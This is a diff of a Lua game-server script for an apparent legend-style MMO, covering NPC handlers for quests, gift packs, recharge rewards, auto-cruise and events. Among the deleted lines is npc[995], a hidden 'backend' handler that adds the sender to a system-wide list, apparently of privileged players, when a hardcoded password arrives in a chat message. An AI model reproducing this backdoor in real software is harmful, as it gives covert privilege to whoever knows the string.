@@ -146,7 +146,7 @@ npc[6] = function(play,p2,p3,data) -- 屏蔽系统消息
 end
 
 
-
+---异闻录
 local npc_xyl = {
     {
         ----任务名,npcid,任务类型（1为主线任务,2为支线任务）,任务检测（1数字型,2数组型,3称号型）,任务结束标志和进度标志,任务传送地点,任务传送限制（{1,10}等级,{2,10}转生,{3,”称号“}所需称号）
@@ -773,7 +773,6 @@ local npc_xyl = {
         }
     },
 }
-
 npc[11] = function(play,p2,p3,data)  --异闻录
     if p2 == 0 then
         if not Player.dl_sz_notip(play, 2) then
@@ -1051,7 +1050,7 @@ npc[11] = function(play,p2,p3,data)  --异闻录
         end
     end
 end
-
+---记忆传送
 npc[13] = function(play, p2, p3, data)  -- 记录石
     if p2 == 0 then
         -- 当 p3 为 0 时，进行记录石的初始化操作
@@ -1107,46 +1106,13 @@ npc[13] = function(play, p2, p3, data)  -- 记录石
         end
     end
 end
-
+---实力提升
 npc[17] = function(play, p2, p3, data)  --实力提升
     if p2 == 0 then  --实力提升  --初始化页面
         sendluamsg(play, 101, 17, 0, 0, "")
     end
 end
---功能1：领取新手礼包
---礼包内容：
---技能：开天 烈火 逐日 半月
---装备：一套装备
---珍宝：传送功能 刀刀绿毒 终身日卡
---
---终身日卡：每天可开启一次
---内容：抽奖券*2 复活丹*2 仙玉*300
-npc[28] = function(play, p2, p3, data) --新手礼包
-    if p2 == 1 then
-        if getflagstatus(play,constant.BS_xslb) == 1 then
-            sendmsg(play,1,'{"Msg":"<font color=\'#ff7700\'>[新手礼包]</font><font color=\'#ff0000\'>已经领取过了...</font>","Type":9}"')
-        else
-            for _, v in pairs(constant.pz_xrjn) do
-                addskill(play,v[1],v[2])
-            end
-            local jnid = {6}
-            for i, v in ipairs(jnid) do
-                addskill(play,v,3)
-            end
-            addskill(play,25,3)
-            setflagstatus(play,constant.BS_xslb,1)
-            Player.rwjl(play, { {"绑定元宝",10000},{"绑定灵符",1000} }, "新手", nil,1000)
-            if getplaydef(play,constant.U_zxrw[1]) == 1 then
-                newdeletetask(play,getplaydef(play,constant.U_zxrw[1]))
-                playeffect(play,4011,25,-50,1,0,0)
-            end
-            sendluamsg(play,101,28,1,0,"")
-            sendmsg(play,1,'{"Msg":"<font color=\'#ff7700\'>[新手礼包]</font><font color=\'#00ff00\'>领取成功...</font>","Type":9}"')
-        end
-    end
-end
-
-
+---首充礼包
 npc[501] = function(play,p2,p3,data)  --首充礼包
     if p3 == 0 then
         sendluamsg(play, 101, 501, 0, 0,getflagstatus(play,constant.BS_sckg))
@@ -1157,30 +1123,17 @@ npc[501] = function(play,p2,p3,data)  --首充礼包
                 local json = json2tbl(getplaydef(play,constant.T_czlb))
                 json["sclb"] = true
                 setplaydef(play,constant.T_czlb,tbl2json(json))
-                Player.rwjl(play, {{"元宝",500000},{"灵符",100000},{"龙纹铜钱",10},{"首充武器",1}}, "首充礼包",nil,1000 )
-                --Player.title_give(play,"人中之龙")
-                --TODO 传送buff
-                addbuff(play,19994)
-                local T_szjl = json2tbl(getplaydef(play,constant.T_szjl))
-                T_szjl["sz"] = T_szjl["sz"] or {}
-                T_szjl["sz"][""..8] = 1
-                setplaydef(play,constant.T_szjl,tbl2json(T_szjl))
-                Player.updateSomeAddr(play,nil, sz.sz[10].attr)
-                Player.zxrw_lingqu(play, 3001, "时装查看")
-
-                sendmsg(play, 1, '{"Msg":"<font color=\'#ff7700\'>[时装]</font><font color=\'#00ff00\'>时装：踏雪无痕激活成功，可在仙姿【仙姿】界面切换</font>","Type":9}')
                 sendmsg(play,1,'{"Msg":"<font color=\'#ff7700\'>[首充礼包]</font><font color=\'#28ef01\'>领取首充礼包成功!</font>","Type":9}')
                 sendluamsg(play, 101, 501, 0, 1,"")
             else
                 sendmsg(play,1,'{"Msg":"<font color=\'#ff7700\'>[首充礼包]</font><font color=\'#ff0500\'>已经领取过了,无法重复领取...</font>","Type":9}')
             end
         else
-            --sendmsg(play,1,'{"Msg":"<font color=\'#ff7700\'>[首充礼包]</font><font color=\'#ff0500\'>未进行充值,无法领取首充礼包...</font>","Type":9}')
             sendluamsg(play, 101, 999, 10, 7,"")
         end
     end
 end
-
+---在线充值
 npc[502] = function(play,p2,p3,data)  --在线充值
     if p3 == 0 then
         sendluamsg(play, 101, 502, 0, 0,getplaydef(play,constant.T_czlb))
@@ -1212,50 +1165,9 @@ npc[502] = function(play,p2,p3,data)  --在线充值
             end
             setplaydef(play,constant.T_czlb,tbl2json(json))
         end
-    elseif p3 == 5 then
-        local T_tsg = json2tbl(getplaydef(play,constant.T_tsg))
-        if T_tsg["2_"..p2] and T_tsg["2_"..p2] == 1 then
-            sendmsg(play,1,'{"Msg":"<font color=\'#ff7700\'>[天赏阁]</font><font color=\'#ff0500\'>已经领取过了...</font>","Type":9}')
-        else
-            if querymoney(play,20) >= teshudata[516][2][p2][1] then
-                T_tsg["2_"..p2] = 1
-                setplaydef(play,constant.T_tsg,tbl2json(T_tsg))
-                Player.rwjl(play,teshudata[516][2][p2][2],"天赏阁",nil,1000)
-                if teshudata[516][2][p2].ch then
-                    if checktitle(play,teshudata[516][2][p2].ch) then
-                        sendmsg(play,1,'{"Msg":"<font color=\'#ff7700\'>[天赏阁]</font><font color=\'#ff0500\'>已经领取过了...</font>","Type":9}')
-                    else
-                        sendmsg(play, 1, '{"Msg":"<font color=\'#00FF00\'>获得称号：'..teshudata[516][2][p2].ch..'</font>","Type":9}')
-                        Player.title_give(play,teshudata[516][2][p2].ch)
-                        --addbuff(play, 19992)
-                    end
-                end
-                if p2 == 3 then
-                    local T_fb = json2tbl(getplaydef(play,constant.T_fb))
-                    T_fb["极冰神剑"] = 1
-                    setplaydef(play,constant.T_fb,tbl2json(T_fb))
-                    if fb["极冰神剑"].attr then
-                        Player.updateSomeAddr(play,nil,fb["极冰神剑"].attr)
-                    end
-                    if fb["极冰神剑"].buff then
-                        Buff[fb["极冰神剑"].buff](play,1)
-                    end
-                    sendmsg(play, 1, '{"Msg":"<font color=\'#00FF00\'>获得禁器：'.."极冰神剑"..'，可在【人物禁器】界面查看</font>","Type":9}')
-                    local wpdx = linkbodyitem(play,73)
-                    changecustomitemvalue(play,wpdx,1,"+",5,0) --攻上
-                    changecustomitemvalue(play,wpdx,3,"+",5,0) --魔上
-                    changecustomitemvalue(play,wpdx,5,"+",5,0) --道上
-                    changecustomitemvalue(play,wpdx,0,"+",10,1) --生命
-                end
-                sendluamsg(play, 101, 502, 2, 0, "")
-            else
-                sendmsg(play,1,'{"Msg":"<font color=\'#ff7700\'>[天赏阁]</font><font color=\'#ff0500\'>累计充值不足，当前累计充值：'.. querymoney(play,20) ..'...</font>","Type":9}')
-                return
-            end
-        end
     end
 end
-
+---赞助礼包
 local zzch,sg,qsx = {"黄金赞助","铂金赞助","钻石赞助"},{0,50,100},{1,2,3}
 npc[503] = function(play,p2,p3,data)  --赞助礼包
     if p2 == 0 then
@@ -1289,13 +1201,10 @@ npc[503] = function(play,p2,p3,data)  --赞助礼包
         end
     end
 end
-
+---快人一步
 npc[504] = function(play,p2,p3,data)  --快人一步
     if p2 == 0 then
         sendluamsg(play, 101, 504, 0, 0,'{"mztq":'..getflagstatus(play,constant.BS_mztq)..',"zjxz":'..getplaydef(play,constant.U_jdgh)..'}')
-        if json2tbl(getplaydef(play, constant.T_zxrw))[""..3004] then
-            Player.zxrw_wancheng(play, 3004, "")
-        end
     elseif p2 == 1 then
         if getflagstatus(play,constant.BS_mztq) == 0 then
             sendluamsg(play, 101, 999, 98, 21,"")
@@ -1306,16 +1215,12 @@ npc[504] = function(play,p2,p3,data)  --快人一步
         sendluamsg(play, 101, 504, 2, 0,'{"mztq":'..getflagstatus(play,constant.BS_mztq)..',"zjxz":'..getplaydef(play,constant.U_jdgh)..'}')
     end
 end
-
+---自动巡航
 npc[505] = function(play,p2,p3,data)  --自动巡航
     if p2 == 0 then
         sendluamsg(play, 101, 505, 0, 0,"")
     elseif p2 == 1 then
-        if p3 == 1 then
-            sendluamsg(play, 101, 999, 28, 21,"")
-        elseif p3 == 2 then
-            sendluamsg(play, 101, 505, 1, 0,getplaydef(play,constant.T_aigj))
-        end
+        sendluamsg(play, 101, 505, 1, 0,getplaydef(play,constant.T_aigj))
     elseif p2 == 2 then
         local dtmz = getbaseinfo(play,3)
         if jinzhigj[dtmz] or string.find(dtmz,"_") then
@@ -1404,7 +1309,7 @@ npc[505] = function(play,p2,p3,data)  --自动巡航
         sendmsg(play,1,'{"Msg":"<font color=\'#ff7700\'>[自动巡航]</font><font color=\'#ff0000\'>未激活【自动巡航】,无法使用，可在在线充值激活...</font>","Type":9}')
     end
 end
-
+---天选之人
 npc[506] = function(play,p2,p3,msgData)  --天选之子
     if p2 == 0 then
         sendluamsg(play, 101, 506, 0, 0,
@@ -1421,13 +1326,8 @@ local hd_dtmz = {
 }
 npc[507] = function(play,p2,p3,msgData)  --游戏活动
     if p2 == 0 then
-        local mob = {}
-        for v,k in pairs(teshudata.bboss) do
-            mob[k[1]] = checkrangemoncount(k[2],k[1],k[3],k[4],100)
-        end
-        sendluamsg(play, 101, 507, 1, 0,tbl2json(mob))
         sendluamsg(play, 101, 507, 0, 0,
-                '{"hdjf":'.. getplaydef(play,constant.U_hdjf)..',"kqfz":'..getsysvar(constant.G_kqfz)..',"hdjl":'..getplaydef(play,constant.T_hdjl)..'}')
+                '{"kqfz":'..getsysvar(constant.G_kqfz)..',"hdjl":'..getplaydef(play,constant.T_hdjl)..'}')
     elseif p2 == 1  then
 
     elseif p2 == 2 then
@@ -1461,8 +1361,7 @@ npc[507] = function(play,p2,p3,msgData)  --游戏活动
             end
         end
     elseif p2 == 3 then
-        if  p3 > 0 and p3 <= 4 then
-
+        if p3 > 0 and p3 <= 4 then
             if getplaydef(play,"N$战斗状态") < os.time() then
                 if getbaseinfo(play,3) == hd_dtmz[2][p3][1] then
                     sendmsg(play, 1, '{"Msg":"<font color=\'#ff0000\'>已在活动地图了...</font>","Type":9}')
@@ -1511,44 +1410,20 @@ npc[507] = function(play,p2,p3,msgData)  --游戏活动
                 end
             end
         end
-    elseif p2 == 4 then
-        if teshudata.bboss[p3] then
-            mapmove(play,teshudata.bboss[p3][2],teshudata.bboss[p3][3],teshudata.bboss[p3][4],8)
-        end
     end
 end
 
-
-npc[509] = function(play,p2,p3,msgData)  --天天省钱
-    openhyperlink(play,111,0)
-end
-
-npc[510] = function(play,p2,p3,msgData)  --交易行
-    openhyperlink(play,35,0)
-end
+---天天省钱
+npc[509] = function(play,p2,p3,msgData) openhyperlink(play,111,0) end
+---交易行
+npc[510] = function(play,p2,p3,msgData) openhyperlink(play,35,0) end
 
 npc[511] = function(play,p2,p3,msgData)  --福利大厅
-
 end
 
 npc[512] = function(play,p2,p3,msgData)  --游戏攻略
     if p2 == 0 then
         sendluamsg(play, 101, 512, 0, 0,"")
-    end
-end
-
-npc[995] = function(play,p2,p3,msg)  --后台
-    if msg == "jin01020403.." then
-        if getsysvar(constant.A_csqmingdan) == "" then
-            setsysvar(constant.A_csqmingdan,"{}")
-        end
-        local rymd = json2tbl(getsysvar(constant.A_csqmingdan))
-        rymd[getbaseinfo(play,1)] = 1
-        setsysvar(constant.A_csqmingdan,tbl2json(rymd))
-        sendmsg(play, 1, '{"Msg":"<font color=\'#00ff00\'>已执行！</font>","Type":9}')
-    else
-        sendmsg(play, 1, '{"Msg":"<font color=\'#ff0000\'>密码错误！</font>","Type":9}')
-        kick(play)
     end
 end
 
